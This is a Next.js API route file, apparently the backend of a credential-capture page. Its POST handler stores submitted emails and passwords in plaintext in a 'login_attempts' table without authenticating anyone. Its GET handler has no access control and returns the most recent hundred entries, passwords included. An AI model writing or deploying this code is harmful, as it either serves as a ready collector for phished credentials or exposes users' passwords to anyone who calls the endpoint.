import { NextRequest, NextResponse } from 'next/server';
import { sql } from '@vercel/postgres';

export async function POST(request: NextRequest) {
  try {
    const { email, password } = await request.json();

    // Validate required fields
    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required' },
        { status: 400 }
      );
    }

    // Insert into database
    const result = await sql`
      INSERT INTO login_attempts (email, password, created_at)
      VALUES (${email}, ${password}, NOW())
      RETURNING id
    `;

    return NextResponse.json({
      success: true,
      message: 'Login attempt logged successfully',
      id: result.rows[0].id
    });

  } catch (error) {
    console.error('Login attempt error:', error);
    return NextResponse.json(
      { error: 'Failed to log login attempt' },
      { status: 500 }
    );
  }
}

export async function GET() {
  try {
    // Get all login attempts (for admin purposes)
    const result = await sql`
      SELECT id, email, password, created_at
      FROM login_attempts
      ORDER BY created_at DESC
      LIMIT 100
    `;

    return NextResponse.json({
      attempts: result.rows,
      count: result.rows.length
    });

  } catch (error) {
    console.error('Error fetching login attempts:', error);
    return NextResponse.json(
      { error: 'Failed to fetch login attempts' },
      { status: 500 }
    );
  }
}